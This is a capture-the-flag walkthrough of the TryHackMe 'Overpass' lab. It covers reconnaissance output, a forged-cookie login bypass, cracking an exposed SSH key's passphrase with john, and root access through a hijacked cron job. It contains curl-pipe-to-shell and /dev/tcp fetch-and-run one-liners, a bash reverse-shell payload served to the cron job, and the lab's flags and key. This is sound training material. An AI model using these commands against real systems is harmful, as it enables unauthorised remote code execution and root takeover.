#   Tryhackme - Overpass
##  Walkthrough by
```
Shaswata Saha
11-07-2023
1:07
```

##  Steps :

### IP = 10.10.35.187
1.  nmap scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-10 03:38 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:38
Completed NSE at 03:38, 0.00s elapsed
Initiating NSE at 03:38
Completed NSE at 03:38, 0.00s elapsed
Initiating NSE at 03:38
Completed NSE at 03:38, 0.00s elapsed
Initiating Ping Scan at 03:38
Scanning 10.10.35.187 [2 ports]
Completed Ping Scan at 03:38, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:38
Completed Parallel DNS resolution of 1 host. at 03:38, 0.19s elapsed
Initiating Connect Scan at 03:38
Scanning 10.10.35.187 [1000 ports]
Discovered open port 22/tcp on 10.10.35.187
Discovered open port 80/tcp on 10.10.35.187
Increasing send delay for 10.10.35.187 from 0 to 5 due to 57 out of 189 dropped probes since last increase.
Increasing send delay for 10.10.35.187 from 5 to 10 due to 11 out of 19 dropped probes since last increase.
Completed Connect Scan at 03:39, 42.86s elapsed (1000 total ports)
Initiating Service scan at 03:39
Scanning 2 services on 10.10.35.187
Completed Service scan at 03:39, 13.47s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.35.187.
Initiating NSE at 03:39
Completed NSE at 03:39, 7.05s elapsed
Initiating NSE at 03:39
Completed NSE at 03:39, 0.97s elapsed
Initiating NSE at 03:39
Completed NSE at 03:39, 0.00s elapsed
Nmap scan report for 10.10.35.187
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 03:39
Completed NSE at 03:39, 0.00s elapsed
Initiating NSE at 03:39
Completed NSE at 03:39, 0.00s elapsed
Initiating NSE at 03:39
Completed NSE at 03:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.55 seconds

```

2.  gobuster scan:
```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.187
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/10 03:39:40 Starting gobuster in directory enumeration mode
===============================================================

[2K/css                  (Status: 301) [Size: 0] [--> css/]

[2K/img                  (Status: 301) [Size: 0] [--> img/]

[2K/admin                (Status: 301) [Size: 42] [--> /admin/]

[2K/downloads            (Status: 301) [Size: 0] [--> downloads/]

[2K/main.js              (Status: 200) [Size: 28]

===============================================================
2023/07/10 03:40:30 Finished
===============================================================

```

3.  Got the user /aboutus/
```
Ninja - Lead Developer

Pars - Shibe Enthusiast and Emotional Support Animal Manager

Szymex - Head Of Security

Bee - Chief Drinking Water Coordinator

MuirlandOracle - Cryptography Consultant

```

4.  Open /admin/

 Great! Now there is a login page. I could try a few things here; Bruteforce, SQL injection or Broken Authentication. However, the hint stated it was one of the OWASP Top 10, so brute force is crossed out. So that leaves us with SQL injection or Broken Authentication. I figured I’ll start with Broken Authentication. I read through the source code to observe how the page works. Firefox and Chrome have built-in debuggers to read the loaded javascript files.

5. There are two javascript files loaded here,

    cookie.js
    login.js

cookie.js looked like a common javascript library, so I moved on to login.js because that seemed to be custom code. Hovering through the code, the login() function caught my eye.

6.  The condition checks for the valid credential. If incorrect, it outputs “Incorrect Credentials”, but if correct, it sets a Cookie named SessionToken and redirects the user to /admin. I wonder if the server actually validates the cookie 😉

I created my own cookie using the browser extension EditThisCookie with SessionToken as the name and gave it some random value.

7.  I saved it and reloaded the page. It worked! 👏 The server does not validate the cookie correctly.

8.  We are greeted as the Administrator and there is a note to James. Before we go any further, there are two ways of SSH authentication:

    By username and password
    By username and public-private keypairs.

In here, the private key of the user is exposed 🤦‍♂ ️. The other part i.e. the username could be easily guessed: james. The next step is trying to login through ssh. So, I copied this private key to a file and using the -i flag in ssh, I can provide the private key (usually named id_rsa).

Private key:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

9.  Craack the key:
```
Step 1

Copy the SSH key you want to crack.

cp /.ssh/id_rsa id_rsa

Step 2

To brute-force using john, we have to convert it into a suitable format. For this, we can use ssh2john.py. This comes pre-installed in Kali Linux. You can find it using locate command and copy it to your current working directory.

updatedb #updatedb creates or updates a database used by locate(1)
locate ssh2john.py
cp $(locate ssh2john.py).

Step 3

Next, you have to create a hash file from the id_rsa file to use it with john.

python ssh2john.py id_rsa > id_rsa.hash

Step 4

To conduct the brute force, you need a wordlist. You can try the rockyou wordlist pre-installed in Kali Linux.

locate rockyou.txt.gz
cp $(locate rockyou.txt.gz) .

Unzip the file,

gunzip rockyou.txt.gz

Step 5

At last, we can use john to crack the hash using rockyou.txt and retrieve the passphrase.

john Desktop/tryhackme/Overpass/id.rsa.hash -wordlist=Documents/rockyou.txt

Good Luck cracking it!
```

```bash

┌──(subhro1530㉿subhro)-[~]
└─$ john Desktop/tryhackme/Overpass/id.rsa.hash -wordlist=Documents/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
              (rsa_key)     
1g 0:00:00:00 DONE (2023-07-10 04:36) 25.00g/s 334200p/s 334200c/s 334200C/s pink25..jackets
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

10. Cracking the ssh:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Overpass]
└─$ ssh -i rsa_key james@10.10.35.187 
Enter passphrase for key 'rsa_key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 10 08:52:34 UTC 2023

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.35.187
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```

11. Let's see what's inside the todo.txt file:
```bash
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

12. 
```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

13. Using linpeas:
```bash
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

```
curl 10.10.35.187/linpeas.sh | sh
```


##  Privilege Escalation

>The other file, todo.txt had some juicy info.

>The last bullet point questions on how the user Paradox got the automated build script working and where the builds go. Therefore, there is some sort of automation at working here to build the Go Binaries. The Go Binary and the build script were provided at the /downloads page in the website. I spent a long time trying stuff and did not find anything. With nowhere to go, I tried running LinPeas to get any info.
carlospolop/privilege-escalation-awesome-scripts-suite
PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) …

>After analyzing its output, I noticed it! There was a cron job running to compile the binaries! Ugh, why didn’t I think of that earlier? 🤦‍♂️ It clearly said AUTOMATION.

>Anyways, cron is a time-based job scheduler in *nix systems.

>In /etc/crontab, you can read all the scheduled events. Unfortunately, the current user cannot edit it. Let me explain the cron job,

>This is it. This command is going to be run as root. Since I could not edit the command, I need to somehow inject custom bash code and run it as root. One possible avenue is running a bash script to gain a reverse shell as root. But how could I add my own script in the overpass.thm domain? This is where it gets interesting. Have a look at the /etc/hosts file,

>The overpass.thm domains point to the localhost (127.0.0.1). I can edit it and change it to my IP address. Then I can host a server with a custom bash script which will give me a reverse shell. When the cron job runs, it will go to my server and download my malicious script and make the overpass-prod server run it as root! Thus, gaining a root shell.

>Well, if it is hard to wrap your head around this method, here is a simple diagram explaining the scenario 🙂
### Step 1

Edit the /etc/hosts file to include your machine IP address. Find your IP address using,
```bash
ip addr
```

### Step 2

Create the reverse shell script, name it buildscript.sh and make it executable. Then host it in the exact folder path i.e. /downloads/src

Resource for awesome reverse shells! 👇
Reverse Shell Cheat Sheet
If you're lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards…

pentestmonkey.net
```bash
$ mkdir -p downloads/src 
$ cat 'bash -i >& /dev/tcp/IPADDRESS/8080 0>&1' > /downloads/src/buildscript.sh
$ chmod +x /downloads/src/buildscript.sh
```

### Step 3

Run a server to host your malicious bashscript. There are many ways to create a server, I did it with python since it is easy.
```bash
$ python3 -m http.server 80
```

Note: I hosted the server in port 80 since the cron job is going to request for the default port

### Step 4

In another tab, listen for incoming requests using netcat in port 8080.
```bash
nc -lvpn 8080
```

The server will send request every 1min:
```bash
┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/Overpass]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.35.187 - - [10/Jul/2023 05:28:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.35.187 - - [10/Jul/2023 05:29:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.35.187 - - [10/Jul/2023 05:30:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.35.187 - - [10/Jul/2023 05:31:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.35.187 - - [10/Jul/2023 05:32:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

The netcat catches the request and redirects it to the local folders:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Overpass]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.17.28.202] from (UNKNOWN) [10.10.35.187] 43686
bash: cannot set terminal process group (3468): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
 
```
We got the root..!